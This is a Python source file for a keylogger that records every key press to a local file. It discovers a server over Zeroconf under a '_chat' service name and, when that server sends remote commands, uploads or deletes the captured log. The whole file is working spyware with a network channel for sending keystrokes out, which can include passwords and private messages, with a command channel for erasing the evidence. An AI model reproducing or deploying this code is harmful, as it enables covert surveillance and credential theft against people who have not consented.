import socket
import time
import threading
from pynput.keyboard import Controller, Key
from zeroconf import Zeroconf, ServiceBrowser, ServiceListener

SERVICE_TYPE = "_chat._tcp.local."
server_ip = None
server_port = None
connected = False
tcp_client = None
keyboard = Controller()


class ChatListener(ServiceListener):
    def add_service(self, zeroconf, type, name):
        global server_ip, server_port, connected, tcp_client
        info = zeroconf.get_service_info(type, name)
        if info:
            server_ip = socket.inet_ntoa(info.addresses[0])
            server_port = info.port
            connected = True
            try:
                tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_client.connect((server_ip, server_port))
                print("[KEYLOGGER] 📡 TCP connection established!")
    
    # Start receiver thread only after TCP is connected
                threading.Thread(target=receive, daemon=True).start()
            except Exception as e:
                print(f"[KEYLOGGER] ❌ Failed to connect to server: {e}")

            print(f"[KEYLOGGER] ✅ Found server at {server_ip}:{server_port}")

    def remove_service(self, zeroconf, type, name):
        pass

    def update_service(self, zeroconf, type, name):
        pass

# 🎯 Background thread function to wait until connected
def wait_for_server():
    global connected
    print("[KEYLOGGER] 🔍 Searching for server in background...")
    for _ in range(10):
        if connected:
            break
        time.sleep(1)
    
    if connected:
        print("[KEYLOGGER] 🎉 Connected and ready to use.")
    else:
        pass


# 👷 Start Zeroconf service browser
zeroconf = Zeroconf()
listener = ChatListener()
ServiceBrowser(zeroconf, SERVICE_TYPE, listener)

# 🚀 Start waiting thread
wait_thread = threading.Thread(target=wait_for_server, daemon=True)
wait_thread.start()

def receive():
    global connected, tcp_client, zeroconf
    while connected:
        try:
            command = tcp_client.recv(1024)
            if not command:
                break
            command = command.decode().strip()

            if command == "sendlog":
                with open("keylog.txt", "r") as file:
                    log = file.read()
                tcp_client.sendall(log.encode())

            elif command == "deletelog":
                with open("keylog.txt", "w") as file:
                    file.write("")
                msg = "Keylog Deleted!"
                tcp_client.sendall(msg.encode())

            elif command == "disconnect":
                print("[KEYLOGGER] 🚪 Disconnect command received.")
                
                # Close TCP client
                tcp_client.close()
                tcp_client = None

                # Reset connection status
                connected = False

                # Stop Zeroconf (old instance)
                zeroconf.close()

                # Start new discovery
                zeroconf = Zeroconf()
                ServiceBrowser(zeroconf, SERVICE_TYPE, ChatListener())
                threading.Thread(target=wait_for_server, daemon=True).start()

                break

        except Exception as e:
            print(f"[KEYLOGGER] ⚠️ Error in receive loop: {e}")
            break




from pynput import keyboard

# Set to keep track of currently pressed keys
pressed_keys_set = set()

# Mapping for special pynput Key objects to their desired display names.
KEY_DISPLAY_NAMES = {
    keyboard.Key.alt_l: "Alt",
    keyboard.Key.alt_r: "Alt",
    keyboard.Key.cmd_l: "Command",
    keyboard.Key.cmd_r: "Command",
    keyboard.Key.ctrl_l: "Control",
    keyboard.Key.ctrl_r: "Control",
    keyboard.Key.shift_l: "Shift",
    keyboard.Key.shift_r: "Shift",
    keyboard.Key.space: "Space",
    keyboard.Key.enter: "Enter",
    keyboard.Key.backspace: "Backspace",
    keyboard.Key.tab: "Tab",
    keyboard.Key.esc: "Escape",
    keyboard.Key.caps_lock: "Caps Lock",
    keyboard.Key.delete: "Delete",
    keyboard.Key.home: "Home",
    keyboard.Key.end: "End",
    keyboard.Key.page_up: "Page Up",
    keyboard.Key.page_down: "Page Down",
    keyboard.Key.insert: "Insert",
    keyboard.Key.num_lock: "Num Lock",
    keyboard.Key.print_screen: "Print Screen",
    keyboard.Key.scroll_lock: "Scroll Lock",
    keyboard.Key.pause: "Pause",
    keyboard.Key.f1: "F1", keyboard.Key.f2: "F2", keyboard.Key.f3: "F3",
    keyboard.Key.f4: "F4", keyboard.Key.f5: "F5", keyboard.Key.f6: "F6",
    keyboard.Key.f7: "F7", keyboard.Key.f8: "F8", keyboard.Key.f9: "F9",
    keyboard.Key.f10: "F10", keyboard.Key.f11: "F11", keyboard.Key.f12: "F12",
    keyboard.Key.up: "Up",
    keyboard.Key.down: "Down",
    keyboard.Key.left: "Left",
    keyboard.Key.right: "Right",
    keyboard.Key.alt_gr: "AltGr", # Added AltGr for more comprehensive coverage
}

def get_key_name(key):
    """
    Returns a readable string name for a given pynput Key or KeyCode object.
    It uses the KEY_DISPLAY_NAMES map for special keys, otherwise
    it returns the character for character keys or a cleaned-up default name.
    """
    if isinstance(key, keyboard.KeyCode):
        if key.char is not None:
            return str(key.char)
    elif isinstance(key, keyboard.Key):
        return KEY_DISPLAY_NAMES.get(key, str(key).replace('Key.', '').replace('_', ' ').title())
    return None

def on_press(key):
    """
    Handles key press events. It updates the set of currently pressed keys
    for console output and logs the individual key to a file.
    """
    # --- Update pressed keys for console output ---
    try:
        pressed_keys_set.add(key)
        display_keys = []
        for p_key in sorted(list(pressed_keys_set), key=lambda k: str(k)):
            name = get_key_name(p_key)
            if name:
                display_keys.append(name)
        
        if display_keys:
            print("+".join([f"[{k}]" for k in display_keys]))

    except Exception as e:
        print(f"Error in console display: {e}")

    # --- Log individual key to file ---
    try:
        with open("keylog.txt", "a") as file:
            if isinstance(key, keyboard.KeyCode) and key.char is not None:
                # Log regular character keys directly
                file.write(key.char)
            else:
                # Log special keys with brackets
                name_to_log = get_key_name(key)
                if name_to_log:
                    if key == keyboard.Key.enter:
                        file.write("[Enter]\n") # Add newline for Enter key
                    elif key == keyboard.Key.space:
                        file.write(" ") # Log space as a single space character
                    else:
                        file.write(f"[{name_to_log}]")
    except Exception as e:
        print(f"Error logging to file: {e}")

def on_release(key):
    """
    Handles key release events. Removes the key from the pressed set.
    Stops the listener if the 'Esc' key is released.
    """
    try:
        if key in pressed_keys_set:
            pressed_keys_set.remove(key)
    except KeyError:
        pass # Key might not have been tracked initially
    except Exception as e:
        print(f"Error on key release: {e}")

    # Stop listener on 'Esc' key release
    if key == keyboard.Key.esc:
        print("\n'Esc' key pressed. Stopping keyboard listener.")
        return False

# --- Start Listener ---
print("Keyboard listener started. Press keys to see combinations and log them.")
print("Press 'Esc' to stop the listener.")
print("Key presses are logged to 'keylog.txt'.")

# Set up and start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keyboard listener successfully stopped.")

zeroconf.close()
